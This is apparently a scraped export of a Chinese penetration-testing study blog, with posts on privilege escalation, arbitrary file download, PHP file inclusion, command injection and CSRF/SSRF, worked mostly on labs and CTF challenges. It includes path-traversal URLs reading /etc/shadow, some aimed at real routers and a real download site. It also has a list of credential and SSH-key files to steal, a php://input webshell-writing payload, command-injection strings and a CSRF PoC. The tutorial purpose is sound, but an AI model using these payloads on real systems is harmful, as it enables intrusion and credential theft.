/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: keep-aliveReferer: http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AFCookie: csrftoken=vKkecYAHNQy0hBzIqkW7oaJw91c8w1DPtQhCAWIXKPPgjuxTF3uii1r7lXPlDHeL; PHPSESSID=f269db34aa678e173b4b5da42cd715e4Upgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1 如何知道其他用户的用户名呢，可以通过注册时，该用户名已存在或者网站其他信息来进行收集。 可以看到这里我通过修改name为lucy获取到了其他用户的信息。 垂直越权 前提条件 如何获取admin添加用户数据包 普通用户前端有操作界面可以抓取数据包 通过网站源码进行本地复现抓取 盲猜 有两个用户一个是admin/123456一个是pikachu/000000。其中admin是超级用户 通过抓取admin用户添加其他用户的数据包 然后登录普通用户，尝试利用抓取的数据包进行创建用户。发现创建失败，这是因为当前admin用户的Cookie已经失效，我们换成pikachu的用户进行尝试，发现创建成功。 这就是垂直越权，通过普通用户的权限却执行了admin用户的事。 类似的还有通过修改普通用户密码，将管理员密码修改成功也是垂直越权。 越权检测-小米范越权漏洞检测工具（工具使用）越权检测-Burpsuite 插件 Authz 安装测试（插件使用）1https://blog.csdn.net/weixin_33736666/article/details/113376904","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"逻辑越权","slug":"逻辑越权","permalink":"https://al0nez.github.io/tags/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"}]},{"title":"32WEB漏洞-文件操作之文件下载读取全解","slug":"32WEB漏洞-文件操作之文件下载读取全解","date":"2021-09-21T02:35:42.000Z","updated":"2021-09-21T06:00:27.771Z","comments":true,"path":"2021/09/21/32WEB漏洞-文件操作之文件下载读取全解/","link":"","permalink":"https://al0nez.github.io/2021/09/21/32WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%85%A8%E8%A7%A3/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言 文件下载原理一些提供了文件查看或者下载功能的web应用在对用户查看或下载的文件没有限制的情况下，导致恶意用户能够查看或下载任意敏感文件 检测白盒 代码审计 黑盒 公开漏洞 漏扫工具 手工看参数值及功能 利用 常见文件 后台日志等可见的文件 敏感文件 数据库配置文件 各种接口文件 密钥信息等文件 123456789101112131415161718192021222324252627282930313233343536373839Windows:C:\\boot.ini //查看系统版本C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件C:\\Windows\\repair\\sam //存储系统初次安装的密码C:\\Program Files\\mysql\\my.ini //Mysql配置C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql rootC:\\Windows\\php.ini //php配置信息C:\\Windows\\my.ini //Mysql配置信息Linux/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥/root/.ssh/known_hosts//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。/etc/passwd // 账户信息/etc/shadow // 账户密码文件/etc/my.cnf //mysql 配置文件/etc/httpd/conf/httpd.conf // Apache配置文件/root/.bash_history //用户历史命令记录文件/root/.mysql_history //mysql历史命令记录文件/proc/self/fd/fd[0-9]*(文件标识符)/proc/mounts //记录系统挂载设备/porc/config.gz //内核配置文件/var/lib/mlocate/mlocate.db //全文件路径/porc/self/cmdline //当前进程的cmdline参数java+apache站点:/conf/tomcat-users.xml/WEB-INF/classes/applicationContext.xml/WEB-INF/web.xml/etc/httpd/conf/httpd.conf/etc/apache2/httpd.conf/etc/apache2/apache2.confnginx服务器:/etc/nginx/nginx.conf/usr/local/nginx/conf/nginx.conf/usr/local/etc/nginx/nginx.conf 下载参数12345678read.xxx?filename=down.xxx?filename=readfile.xxx?file=downfile.xxx?file=../ ..\\ .\\ ./等%00 ? %23 %20 .等&amp;readpath=、&amp;filepath=、&amp;path=、&amp;inputfile=、&amp;url=、&amp;data=、&amp;readfile=、&amp;menu=、META-INF= 、WEB-INF 各种协议调用配合Javaweb 文件下载代码 123456789101112131415161718192021222324252627282930&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%String path = request.getContextPath();String basePath =request.getScheme()+&quot;://&quot;+request.getServerName()+&quot;:&quot;+request.getServerPort()+path+&quot;/&quot;;%&gt;&lt;a href=&quot;/download/DownloadServlet?filename=1.jpg&quot;&gt;文件下载&lt;/a&gt;public void doGet(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException &#123;response.setCharacterEncoding(&quot;UTF-8&quot;);//设置 ContentType 字段值response.setContentType(&quot;text/html;charset=utf-8&quot;);//获取所要下载的文件名称String filename = request.getParameter(&quot;filename&quot;);//下载文件所在目录String folder = &quot;/filename/&quot;;//通知浏览器以下载的方式打开response.addHeader(&quot;Content-type&quot;, &quot;appllication/octet-stream&quot;);response.addHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=&quot;+filename);//通知文件流读取文件InputStream in = getServletContext().getResourceAsStream(folder+filename);//获取 response 对象的输出流OutputStream out = response.getOutputStream();byte[] buffer = new byte[1024];int len;//循环取出流中的数据while((len = in.read(buffer)) != -1)&#123;out.write(buffer,0,len);&#125;&#125; 涉及案例：Pikachu-文件下载测试-参数点击图片会进行下载，下载链接如下，可以很容易看出是文件下载漏洞，只需要修改filename后面的参数就可以下载任意文件。 1http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png 图片链接地址 1http://127.0.0.1/pikachu/vul/unsafedownload/download/kb.png 可以看到他们不在一个目录下，这里我试着下载一下execdownload.php文件，所有需要退一级目录 1http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php 可以看到我们成功下载了这个文件。那么我们是不是可以下载配置文件呢！查看我们刚下载的文件发现有一个配置文件。 1http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../inc/function.php 成功下载到该文件 Zdns-文件下载真实测试-功能点当我们点击下载后会进行下载 复制下载链接发现问题，这里用了base64加密 1http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMTA4MDYveXN0cHpzXzEuMS43X2RhbmdiZWkuYXBr 可以看到经过解密发现，这里加密的内容和我们下载的名字一样 12345L2Rvd24vMjAyMTA4MDYveXN0cHpzXzEuMS43X2RhbmdiZWkuYXBr解密:/down/20210806/ystpzs_1.1.7_dangbei.apk 我们下载一下他的html文件 123http://down.znds.com/getdownurl/?s=../apk/app/2019/0909/7206.html加密后http://down.znds.com/getdownurl/?s=Li4vYXBrL2FwcC8yMDE5LzA5MDkvNzIwNi5odG1s 链接被重置了。。但是漏洞应该存在 小米路由器-文件读取真实测试-漏洞fofa中可以找到 1http://xxxxx:8888/api-third-party/download/extdisks../etc/shadow 可以看到我们可以成功下载到他的文件 RoarCTF2019-文件读取真题复现-比赛可以看到这个链接存在一个文件下载漏洞，因为是java环境，所有他的配置文件目录是/WEB-INF/web.xml 1http://4f51f59a-99ce-4c6a-8827-f3a83c98ce38.node4.buuoj.cn:81/Download?filename=help.docx 这里修改下载参数 1http://4f51f59a-99ce-4c6a-8827-f3a83c98ce38.node4.buuoj.cn:81/Download?filename=/WEB-INF/web.xml 这里有个小知识点返回这个错误，表示java接收的是POST参数，不是GET 这里成功下载到配置文件 然后打开发现了flag的信息 12345678&lt;servlet&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt; &lt;-&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; &lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 熟悉javaweb开发的应该知道，此处指的路径是WEB-INF/classes/com/wm/ctf/FlagController.class 根据该路径成功下载到flag文件 1ZmxhZ3thM2E1ZDFkOC0xY2UwLTQwNDMtYTAzMi1mYzE4ODYzZDVjMzR9Cg== 经过解密成为 1flag&#123;a3a5d1d8-1ce0-4043-a032-fc18863d5c34&#125; 百度杯 2017 二月-Zone 真题复现-比赛拓展通过抓包发现Cookie中login=0，我们试着修改为1 登录成功后继续抓包 这里发现文件下载漏洞，成功读取到passwd文件 1..././..././..././etc/passwd 涉及资源 https://www.seebug.org/vuldb/ssvid-98122 https://www.ichunqiu.com/battalion?t=1&amp;r=57475 https://blog.csdn.net/Cheng_May/article/details/78600833 https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"文件下载","slug":"文件下载","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"}]},{"title":"31WEB漏洞-文件操作之文件包含漏洞全解","slug":"31WEB漏洞-文件操作之文件包含漏洞全解","date":"2021-09-21T02:34:57.000Z","updated":"2021-09-21T06:00:32.657Z","comments":true,"path":"2021/09/21/31WEB漏洞-文件操作之文件包含漏洞全解/","link":"","permalink":"https://al0nez.github.io/2021/09/21/31WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 什么是文件包含为了更好的使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。 文件包含产生原因在包含文件时候，为了灵活包含文件，将包含文件设置为变量，通过动态变量引入需要包含的文件时，用户可以通过控制变量，而服务器端没有校验变量，从而导致文件包含漏洞，通常此漏洞出现在PHP中。 12345&lt;?php$file = $_GET[&#x27;file&#x27;];include($file);.......?&gt; 文件包含函数 include include_once require require_once include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。 include 和 require 语句是相同的，除了错误处理方面： require 会生成致命错误（E_COMPILE_ERROR）并停止脚本 include 只生成警告（E_WARNING），并且脚本会继续 include_once 函数会将指定的文件载入并执行里面的程序；此行为和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。 require_once也是一样的，当处理到错误的时候，require_once会停止脚本，include_once不会。 例子文件包含代码 12345678&lt;?php$filename=$_GET[&#x27;filename&#x27;];include($filename);/*$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;);*/?&gt; 本来文件是txt的文本 但是通过文件包含能够执行其中的代码 检测白盒代码审计 黑盒 漏扫工具 公开漏洞 手工看参数值及功能 本地文件包含文件和网站在一个服务器上，类似像127.0.0.1/?file=../../phpinfo.php这样就属于本地文件包含 类型无限制因为1.txt在根目录下，而test/php和她有2级目录，所有需要../退俩次目录 1http://127.0.0.1/123/upload/test.php?filename=../../1.txt 有限制12$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;); include会在filename后面添加一个.html。 %00截断绕过 利用条件 magic_quotes_gpc = Off php版本&lt;5.3.4 长度截断绕过 利用条件 windows，点号需要长于250;linux长于4096 好像绕过不去了。。。。。。。 远程文件包含(危害更大)文件和网站不在一个服务器上，类似像127.0.0.1/?file=www.baidu.com这样就属于远程文件包含。 类型前提条件 allow_url_fopen：为ON时，能读取远程文件，例如file_get_contents()就能读取远程文件 allow_url_include:为ON时，就可以使用include和require的方式包含远程文件。 无限制 如果远程代码时后门，我们就可以通过远程文件包含从而获取webshell。 有限制 通过在后面增加特殊符号来绕过 1%20、%23、? 各种协议流的玩法PHP伪协议总结file:// 协议使用条件： allow_url_fopen:off/on allow_url_fopen:off/on 作用用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。 说明文件系统 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以/、\\、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()， include_path 会可选地搜索，也作为相对的路径。 用法1234567/path/to/file.extrelative/path/to/file.extfileInCwd.extC:/path/to/winfile.extC:\\path\\to\\winfile.ext\\\\smbserver\\share\\path\\to\\winfile.extfile:///path/to/file.ext 示例1.file://[文件的绝对路径和文件名] 1http://127.0.0.1/upload-labs/include.php?file=file://D:\\phpstudy\\www\\phpinfo.txt 2.[文件的相对路径和文件名] 1http://127.0.0.1/upload-labs/include.php?file=../phpinfo.txt 3.[http：//网络路径和文件名] 这里进行远程访问的时候需要allow_url_include=On模式 1http://127.0.0.1/upload-labs/include.php?file=http://127.0.0.1/phpinfo.txt php:// 协议 条件： allow_url_fopen:off/on allow_url_include :仅php://input php://stdin php://memory php://temp 需要on 作用：php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 说明：PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 协议 作用 php://input 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=&quot;multipart/form-data&quot; 的时候php://input 是无效的。 php://output 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 php://fd (&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。 php://memory php://temp (&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。 php://filter (&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 php://filter 参数详解该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下： php://filter 参数 描述 resource=&lt;要过滤的数据流&gt; 必须项。它指定了你要筛选过滤的数据流。 read=&lt;读链的过滤器&gt; 可选项。可以设定一个或多个过滤器名称，以管道符（*\\ *）分隔。 write=&lt;写链的过滤器&gt; 可选项。可以设定一个或多个过滤器名称，以管道符（\\ ）分隔。 &lt;; 两个链的过滤器&gt; 任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。 可用的过滤器列表（4类）此处列举主要的过滤器类型，详细内容请参考：https://www.php.net/manual/zh/filters.php 字符串过滤器 作用 string.rot13 等同于str_rot13()，rot13变换 string.toupper 等同于strtoupper()，转大写字母 string.tolower 等同于strtolower()，转小写字母 string.strip_tags 等同于strip_tags()，去除html、PHP语言标签 转换过滤器 作用 convert.base64-encode &amp; convert.base64-decode 等同于base64_encode()和base64_decode()，base64编码解码 convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable 字符串与 8-bit 字符串编码解码 压缩过滤器 作用 zlib.deflate &amp; zlib.inflate 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 bzip2.compress &amp; bzip2.decompress 同上，在本地文件系统中创建 bz2 兼容文件的方法。 加密过滤器 作用 mcrypt.* libmcrypt 对称加密算法 mdecrypt.* libmcrypt 对称解密算法 示例： php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码） 1http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php php://input + [POST DATA]执行php代码 123http://127.0.0.1/include.php?file=php://input[POST DATA部分]&lt;?php phpinfo(); ?&gt; 若有写入权限，写入一句话木马 123http://127.0.0.1/include.php?file=php://input[POST DATA部分]&lt;?php fputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt; 参考：https://php.net/manual/zh/wrappers.php.php zip:// &amp; bzip2:// &amp; zlib:// 协议 条件： allow_url_fopen:off/on allow_url_include :off/on 作用：zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。 示例： zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23） 压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传 1http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt compress.bzip2://file.bz2 压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名） 1http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2 compress.zlib://file.gz 压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名） 1http://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz 参考：http://php.net/manual/zh/wrappers.compression.php data://协议 条件： allow_url_fopen:on allow_url_include :on 作用：自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。 用法： 12data://text/plain,data://text/plain;base64, 示例： data://text/plain, 1http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; data://text/plain;base64, 1http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b http:// &amp; https://协议 条件： allow_url_fopen:on allow_url_include :on 作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。 用法： 123456http://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com 示例： 1http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt phar://协议phar://协议与zip://类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例： 1http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt 另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：phar://协议对象注入技术。 因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。 参考文章：seebug - 利用 phar 拓展 php 反序列化漏洞攻击面 涉及资源： https://www.seebug.org/vuldb/ssvid-98122 https://www.ichunqiu.com/battalion?t=1&amp;r=57475 https://blog.csdn.net/Cheng_May/article/details/78600833 https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"文件包含","slug":"文件包含","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"30WEB漏洞-RCE代码及命令执行漏洞全解","slug":"30WEB漏洞-RCE代码及命令执行漏洞全解","date":"2021-09-21T02:34:56.000Z","updated":"2021-09-21T06:00:39.953Z","comments":true,"path":"2021/09/21/30WEB漏洞-RCE代码及命令执行漏洞全解/","link":"","permalink":"https://al0nez.github.io/2021/09/21/30WEB%E6%BC%8F%E6%B4%9E-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代 码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏 洞。同样调用系统命令处理，将造成命令执行漏洞。 代码执行 RCE 漏洞形成 可控变量 漏洞函数 原理会将我们输入的数据当做代码来执行，如果我们当前的网站是PHP就当做PHP语言来执行。 检测白盒 代码审计 黑盒 漏扫工具 公开漏洞 手工看参数值及功能点 相关函数1eval() 将输入的字符串当做PHP代码执行 1assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动 1call_user_func() 把第一参数作为回调函数 1call_user_func_array() 调用回到函数,并把第一个数组参数作为回到函数的参数 1array_map() 为数组的每个元素应用回调函数 防御 敏感函数禁用 变量过滤或固定 WAF产品 案例演示这题是一个白盒测试，需要代码审计 该代码是将一个字符串进行解密，然后执行脚本命令 解密后发现是接收一个a参数 直接使用?a=ls执行命令 命令执行系统 linux windows 原理应用在调用这些函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞。 形成 可控变量 漏洞函数 命令拼接Linux 12345678910111213A;B A 不论正确与否都会执行 BA&amp;B A 后台运行，A 和 B 同时执行A&amp;&amp;B A 执行成功时候才会执行 B 命令A|B A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令A||B A 执行失败后才会执行 B 命令`` 反单引号linux下会当做命令来执行127.0.0.1 ; cat /etc/passwd 127.0.0.1 &amp; cat /etc/passwd 127.0.0.1 &amp;&amp; cat /etc/passwd 127.0.0.1 | cat /etc/passwd 233 || cat /etc/passwd windows 1234&quot;|&quot;: 直接执行后面的语句。&quot;||&quot;: 如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。&quot;&amp;&quot;： 两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。&quot;&amp;&amp;&quot;： 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执 行,前面的语句只能为真。 php相关函数 system(args) 有回显 passthru(args)(有回显) exec(args) （回显最后一行-必须echo输出） shell_exec(args) （无回显-必须输出） 反引号：`` popen(handle,mode)(无回显) proc_open(‘cmd’,‘flag’,‘flag’)（无回显） $process = proc_open(‘dir’,$des,$pipes); echo stream_get_contents($pipes[1]); 案例演示墨者命令注入执行分析 通过抓包绕过前端js检测。使用;进行命令拼接 1iipp=127.0.0.1;ls&amp;submit=Ping 1iipp=127.0.0.1;cat&lt;key_21071211676104.php&amp;submit=Ping 成功获取flag 1mozhe1af4b8cc599a0a837919be1d30d 涉及资源：123456789101112https://www.cnblogs.com/ermei/p/6689005.htmlhttp://blog.leanote.com/post/snowming/9da184ef24bdhttps://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhehttps://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhehttps://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"代码执行","slug":"代码执行","permalink":"https://al0nez.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"name":"命令执行","slug":"命令执行","permalink":"https://al0nez.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"29WEB漏洞-CSRF及SSRF漏洞案例讲解","slug":"29WEB漏洞-CSRF及SSRF漏洞案例讲解","date":"2021-09-21T02:34:55.000Z","updated":"2021-09-21T06:00:48.995Z","comments":true,"path":"2021/09/21/29WEB漏洞-CSRF及SSRF漏洞案例讲解/","link":"","permalink":"https://al0nez.github.io/2021/09/21/29WEB%E6%BC%8F%E6%B4%9E-CSRF%E5%8F%8ASSRF%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%AE%B2%E8%A7%A3/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 CSRF漏洞 什么是CSRFCSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。 CSRF可以做什么你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。 攻击流程用户登录一个正常的网站，并且本地生成了自己的Cookie，然后在不关闭该网站的前提下，用户访问了黑客的网站，黑客通过伪造数据包，向正常网站发起请求，从而造成了CSRF攻击。 案例演示首先我们需要抓取到正常数据包 1&lt;script src=&#x27;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=b232oy&amp;phonenum=aaaaaaa&amp;add=chain&amp;email=vince%40pikachu.com&amp;submit=submit&#x27;&gt;&lt;/script&gt; 使用其他浏览器发送上述代码，需要在前面加上IP地址 这里我是通过将代码写到html文本里，访问html触发代码 也可以使用burp自动生成csrf代码 1234567891011121314&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;boy&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;23232&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;chain&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;vince&amp;#64;pikachu&amp;#46;com&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 将上述代码写到html文件中，一样可以触发CSRF漏洞。 CSRF防御1、当用户发送重要的请求时需要输入原始密码2、设置随机 Token3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章， 黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）4、设置验证码5、限制请求方式只能为 POST 如果在测试CSRF中，数据包有token，一般是没有该漏洞的。 SSRF漏洞什么是SSRFSSRF (Server-Side Request Forgery) 即服务端请求伪造，从字面意思上理解就是伪造一个服务端请求，也即是说攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统。 SSRF漏洞危害利用SSRF可以进行内外网的端口和服务探测、主机本地敏感数据的读取、内外网主机应用程序漏洞的利用等等。 漏洞存在具体可能出现SSRF的地方： 1.社交分享功能：获取超链接的标题等内容进行显示 2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 3.在线翻译：给网址翻译对应网页的内容 4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片 5.图片/文章收藏功能：主要网站会取URL地址中title以及文本的内容作为显示以求一个好的用户体验 6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试 7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作 8.数据库内置功能：数据库的比如mongodb的copyDatabase函数 9.邮件系统：比如接收邮件服务器地址 10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等 11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞，一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain…… 12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web 